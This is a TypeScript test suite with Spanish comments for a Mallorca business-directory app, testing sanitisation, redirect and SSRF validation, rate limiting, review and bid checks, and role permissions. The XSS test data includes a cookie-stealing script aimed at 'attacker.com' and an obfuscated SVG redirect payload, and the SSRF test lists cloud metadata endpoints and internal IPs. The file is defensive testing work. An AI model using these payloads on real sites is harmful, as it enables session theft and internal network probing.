/**
 * advancedZeroTrustSecurity.test.ts
 *
 * 🛡️ SUITE DE SEGURIDAD ZERO-TRUST, SANITIZACIÓN ADVERSARIA Y BLINDAJE CONTRA FRAUDE (2026)
 *
 * Duplica la cobertura de seguridad con pruebas extremas:
 *  1. 🥷 XSS & Injection: Vectores SVG, IFRAME, onload, mutation XSS, Unicode smuggling y RTL override.
 *  2. 🌐 SSRF & Open Redirect: Evasión de validación URL, IPs internas (169.254, 127.0.0.1, 10.x), protocolos raros.
 *  3. ⏱️ Rate Limiting & Anti-Brute Force: Ataques de ráfaga (burst attacks), mitigación de DDoS a nivel de aplicación.
 *  4. ⭐ Moderación y Seguridad de Reseñas: Manipulación de rating (NaN, floats, <1, >5), spam de enlaces y longitud.
 *  5. 👑 Cuadro de Honor: Concurrencia masiva, inyección de precisión sub-céntimo, mecenazgo comunitario malicioso.
 *  6. 🔐 Escalada de Privilegios e Inmutabilidad de Roles: Prevención de IDOR y manipulación de confidenceScore.
 */

import { describe, it, expect, beforeEach } from "vitest";
import {
  sanitizeUserInput,
  validateSafeRedirectUrl,
  checkRateLimit,
  resetRateLimitBuckets,
  validateReviewSecurity,
  validateSpanishTaxId,
  isDisposableEmail,
} from "../../src/lib/managerSecurityEngine.ts";
import {
  processHonorBid,
  processCommunityBoost,
  calculateHonorInvoice,
  type HonorSpotEntry,
} from "../../src/lib/honorBoardEngine.ts";
import { can, PERMISSIONS } from "../../src/lib/permissions.ts";
import type { UserRole } from "../../src/lib/authStore.ts";
import type { ServiceItem } from "../../src/data/services/index.ts";

const mockService: ServiceItem = {
  id: "restaurante-mar-palma",
  slug: "restaurante-mar-palma",
  name: "Restaurante Mar Palma",
  category: "gastronomia-restaurantes",
  zone: "palma",
  address: "Passeig Marítim 10, Palma",
  coordinates: { lat: 39.568, lng: 2.645 },
  rating: 4.9,
  reviewCount: 220,
  priceRange: "€€€",
  verified: true,
  featured: true,
  status: "open",
  googleMapsUrl: "https://maps.google.com/?id=test",
  appleMapsUrl: "https://maps.apple.com/?id=test",
  bingMapsUrl: "https://bing.com/maps/?id=test",
  phone: "+34 971 700 800",
  whatsapp: "+34 971 700 800",
  email: "reservas@marpalma.com",
  website: "https://marpalma.com",
  tags: ["mariscos", "palma", "gourmet"],
  shortDescription: { es: "Alta cocina", en: "Fine dining", ca: "Alta cuina", de: "Feine Küche" },
  fullDescription: { es: "Pescados frescos", en: "Fresh fish", ca: "Peix fresc", de: "Frischer Fisch" },
  image: "/images/mar.jpg",
  schedule: "M-D 12:00-23:00",
  confidenceScore: 95,
};

describe("🛡️ PRUEBAS DE SEGURIDAD ZERO-TRUST Y RESISTENCIA CONTRA ATAQUES ADVERSARIOS (2026)", () => {
  beforeEach(() => {
    resetRateLimitBuckets();
  });

  // ===========================================================================
  // 1. SANITIZACIÓN CONTRA XSS, INYECCIÓN HTML Y FORMATOS INVISIBLES
  // ===========================================================================
  describe("1. Sanitización Estricta contra Vectores XSS & Unicode Smuggling", () => {
    it("debe neutralizar etiquetas HTML peligrosas (<script>, <iframe>, <svg>, <object>)", () => {
      const maliciousVectors = [
        '<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>',
        '<img src="x" onerror="alert(1)">',
        "<svg/onload=\"eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9ldmlsLmNvbSI='))\">",
        '<iframe src="javascript:alert(1)"></iframe>',
        '<body onload="alert(1)">',
        '<a href="javascript:void(0)" onclick="evil()">Click me</a>',
      ];

      for (const vector of maliciousVectors) {
        const sanitized = sanitizeUserInput(vector);
        expect(sanitized).not.toContain("<script");
        expect(sanitized).not.toContain("<img");
        expect(sanitized).not.toContain("<svg");
        expect(sanitized).not.toContain("<iframe");
        expect(sanitized).toContain("&lt;");
      }
    });

    it("debe desarmar caracteres invisibles (Zero-Width Space, RTL override y caracteres de control)", () => {
      // Intento de evasión con Zero-Width Space y RTL Override para disfrazar texto
      const poisoned = "admin\u200B\u200C\u200D\uFEFFuser\u202Ereversed";
      const clean = sanitizeUserInput(poisoned);

      expect(clean).toBe("adminuserreversed");
      expect(clean).not.toContain("\u200B");
      expect(clean).not.toContain("\u202E");
    });

    it("debe truncar payloads que excedan el límite seguro para evitar ataques de denegación de servicio (DoS)", () => {
      const hugePayload = "A".repeat(50000);
      const sanitized = sanitizeUserInput(hugePayload, 500);
      expect(sanitized.length).toBe(500);
    });
  });

  // ===========================================================================
  // 2. VALIDACIÓN DE URLs, PROTECCIÓN SSRF Y OPEN REDIRECT
  // ===========================================================================
  describe("2. Validación de URLs contra Open Redirects y SSRF", () => {
    it("debe permitir rutas relativas seguras pero rechazar esquemas javascript:, data: y vbscript:", () => {
      expect(validateSafeRedirectUrl("/es/servicios")).toBe(true);
      expect(validateSafeRedirectUrl("/ca/cuadro-de-honor")).toBe(true);

      expect(validateSafeRedirectUrl("javascript:alert(1)")).toBe(false);
      expect(validateSafeRedirectUrl("data:text/html,<script>alert(1)</script>")).toBe(false);
      expect(validateSafeRedirectUrl("vbscript:msgbox(1)")).toBe(false);
      expect(validateSafeRedirectUrl("file:///etc/passwd")).toBe(false);
    });

    it("debe bloquear URLs de servicios de metadatos de nube e IPs internas (SSRF Defense)", () => {
      const ssrfTargets = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/computeMetadata/v1/",
        "http://10.0.0.1/admin",
        "http://192.168.1.1/router",
        "http://0.0.0.0:8080",
      ];

      for (const target of ssrfTargets) {
        expect(validateSafeRedirectUrl(target)).toBe(false);
      }
    });

    it("debe permitir URLs absolutas de dominios autorizados de Servicios Mallorca", () => {
      expect(validateSafeRedirectUrl("https://serviciosmallorca.com/es/unete")).toBe(true);
      expect(validateSafeRedirectUrl("https://app.serviciosmallorca.com/dashboard")).toBe(true);
      expect(validateSafeRedirectUrl("https://evil-serviciosmallorca.com.attacker.com")).toBe(false);
    });
  });

  // ===========================================================================
  // 3. RATE LIMITING Y PROTECCIÓN CONTRA ATAQUES DE FUERZA BRUTA
  // ===========================================================================
  describe("3. Control de Tasa (Rate Limiting) y Mitigación de Spam", () => {
    it("debe permitir peticiones dentro del umbral y bloquear inmediatamente al exceder el límite", () => {
      const clientKey = "user_ip_192.168.1.50_claim_endpoint";
      const maxLimit = 5;
      const windowMs = 10000;
      const startTime = 1000000;

      // 5 peticiones permitidas
      for (let i = 1; i <= maxLimit; i++) {
        const res = checkRateLimit(clientKey, maxLimit, windowMs, startTime + i * 100);
        expect(res.allowed).toBe(true);
        expect(res.remaining).toBe(maxLimit - i);
      }

      // 6ª petición rechazada
      const blocked = checkRateLimit(clientKey, maxLimit, windowMs, startTime + 600);
      expect(blocked.allowed).toBe(false);
      expect(blocked.remaining).toBe(0);

      // Una vez transcurrido el tiempo de ventana, se desbloquea
      const afterWindow = checkRateLimit(clientKey, maxLimit, windowMs, startTime + windowMs + 100);
      expect(afterWindow.allowed).toBe(true);
      expect(afterWindow.remaining).toBe(maxLimit - 1);
    });

    it("debe aislar diferentes claves de clientes sin colisión", () => {
      const clientA = "ip_1.1.1.1";
      const clientB = "ip_2.2.2.2";

      // Bloquear cliente A
      for (let i = 0; i < 3; i++) {
        checkRateLimit(clientA, 3, 5000);
      }
      expect(checkRateLimit(clientA, 3, 5000).allowed).toBe(false);

      // Cliente B debe seguir teniendo su cupo intacto
      expect(checkRateLimit(clientB, 3, 5000).allowed).toBe(true);
    });
  });

  // ===========================================================================
  // 4. MODERACIÓN Y SEGURIDAD EN RESEÑAS COMUNITARIAS
  // ===========================================================================
  describe("4. Blindaje del Sistema de Reseñas contra Fraude y Manipulación", () => {
    it("debe rechazar reseñas de usuarios anónimos o sin ID de negocio", () => {
      const resAnon = validateReviewSecurity({
        text: "Excelente servicio en Palma",
        rating: 5,
        authorUid: "",
        businessId: "restaurante-mar-palma",
      });
      expect(resAnon.safe).toBe(false);
      expect(resAnon.reason).toContain("autenticado");

      const resNoBiz = validateReviewSecurity({
        text: "Excelente servicio en Palma",
        rating: 5,
        authorUid: "uid-12345",
        businessId: "",
      });
      expect(resNoBiz.safe).toBe(false);
    });

    it("debe rechazar puntuaciones manipuladas (0, 6, NaN, Infinity, -1, floats)", () => {
      const badRatings = [0, 6, -1, 3.5, NaN, Infinity, -Infinity];
      for (const rating of badRatings) {
        const res = validateReviewSecurity({
          text: "Opinión sobre el restaurante",
          rating: rating as any,
          authorUid: "uid-12345",
          businessId: "restaurante-mar-palma",
        });
        expect(res.safe).toBe(false);
      }
    });

    it("debe rechazar ataques de spam masivo con enlaces múltiples", () => {
      const spamReview = validateReviewSecurity({
        text: "Visita http://spam1.com y también http://spam2.com y además http://spam3.com para ganar dinero rápido.",
        rating: 5,
        authorUid: "uid-spammer",
        businessId: "restaurante-mar-palma",
      });
      expect(spamReview.safe).toBe(false);
      expect(spamReview.reason).toContain("enlaces externos");
    });
  });

  // ===========================================================================
  // 5. CUADRO DE HONOR: RESISTENCIA CONTRA CONDICIONES DE CARRERA Y PRECISIÓN
  // ===========================================================================
  describe("5. Cuadro de Honor: Fuzzing de Precisión Financiera y Concurrencia", () => {
    it("debe mantener la consistencia del desplazamiento con 50 micro-pujas concurrentes", () => {
      let currentList: HonorSpotEntry[] = [];

      // Simular 50 pujas consecutivas con incrementos de +1€
      for (let i = 1; i <= 50; i++) {
        const result = processHonorBid(
          currentList,
          {
            serviceId: `negocio-${i}`,
            sponsorName: `Titular ${i}`,
            bidAmountEuros: i,
            sponsorMessage: `Puja número ${i}`,
          },
          "artesanos-sabor",
          { ...mockService, id: `negocio-${i}` },
        );

        expect(result.success).toBe(true);
        expect(result.newPosition).toBe(1);
        expect(result.updatedList[0].serviceId).toBe(`negocio-${i}`);
        expect(result.updatedList[0].currentBidEuros).toBe(i);
        expect(result.updatedList.length).toBe(i);
        currentList = result.updatedList;
      }

      // Al final, la puja #50 debe estar en la posición 1 y la #1 en la posición 50
      expect(currentList[0].position).toBe(1);
      expect(currentList[0].currentBidEuros).toBe(50);
      expect(currentList[49].position).toBe(50);
      expect(currentList[49].currentBidEuros).toBe(1);
    });

    it("debe evitar la manipulación de decimales con precisión sub-céntimo", () => {
      // Intentar pujar 1.0000000000001€ o 2.009€
      const subCentBid = processHonorBid(
        [],
        {
          serviceId: "restaurante-mar-palma",
          sponsorName: "Titular",
          bidAmountEuros: 1.0000001,
        },
        "artesanos-sabor",
        mockService,
      );

      expect(subCentBid.success).toBe(true);
      expect(subCentBid.updatedList[0].currentBidEuros).toBe(1.0); // Redondeado limpiamente a 2 decimales
    });

    it("debe calcular la factura fiscal (21% IVA) sin desbordamiento para importes extremos", () => {
      const invoice = calculateHonorInvoice(100000.0);
      expect(invoice.bidAmountEuros).toBe(100000.0);
      expect(invoice.subtotalEuros + invoice.taxAmountEuros).toBe(100000.0);
      expect(invoice.invoiceNumber).toMatch(/^INV-HONOR-/);
    });

    it("debe blindar el impulso comunitario popular contra importes corruptos", () => {
      const hostileBoost = processCommunityBoost(
        [],
        {
          serviceId: "restaurante-mar-palma",
          backerName: "Vecino",
          amountEuros: -50,
        },
        "artesanos-sabor",
        mockService,
      );
      expect(hostileBoost.success).toBe(false);
      expect(hostileBoost.error).toContain("mínima es de 1.00€");
    });
  });

  // ===========================================================================
  // 6. MATRIZ DE AUTORIZACIÓN Y CONTROL DE ACCESO BASADO EN ROLES (RBAC)
  // ===========================================================================
  describe("6. Matriz de Autorización RBAC, Identidad Fiscal y Correos Efímeros", () => {
    it("debe validar exhaustivamente NIFs, NIEs y CIFs rechazando secuencias inválidas", () => {
      expect(validateSpanishTaxId("12345678Z")).toBe(true); // DNI válido (12345678 % 23 = 14 -> Z)
      expect(validateSpanishTaxId("B07123456")).toBe(true); // CIF societario Balear válido
      expect(validateSpanishTaxId("99999999X")).toBe(false); // Letra de control corrupta
      expect(validateSpanishTaxId("A123")).toBe(false); // Longitud insuficiente
    });

    it("debe detectar correos desechables con múltiples niveles de subdominios", () => {
      expect(isDisposableEmail("attacker@sub.sub.mailinator.com")).toBe(true);
      expect(isDisposableEmail("legit@restaurante.es")).toBe(false);
    });

    it("debe denegar permisos administrativos a roles de usuario estándar y manager", () => {
      const userRole: UserRole = "user";
      const managerRole: UserRole = "manager";
      const adminRole: UserRole = "admin";

      expect(can(userRole, PERMISSIONS.MANAGE_SETTINGS)).toBe(false);
      expect(can(userRole, PERMISSIONS.VIEW_ADMIN_PANEL)).toBe(false);
      expect(can(userRole, PERMISSIONS.MANAGE_USERS)).toBe(false);

      expect(can(managerRole, PERMISSIONS.MANAGE_SETTINGS)).toBe(false);
      expect(can(managerRole, PERMISSIONS.MANAGE_USERS)).toBe(false);

      expect(can(adminRole, PERMISSIONS.MANAGE_SETTINGS)).toBe(true);
      expect(can(adminRole, PERMISSIONS.VIEW_ADMIN_PANEL)).toBe(true);
      expect(can(adminRole, PERMISSIONS.MANAGE_USERS)).toBe(true);
    });
  });
});
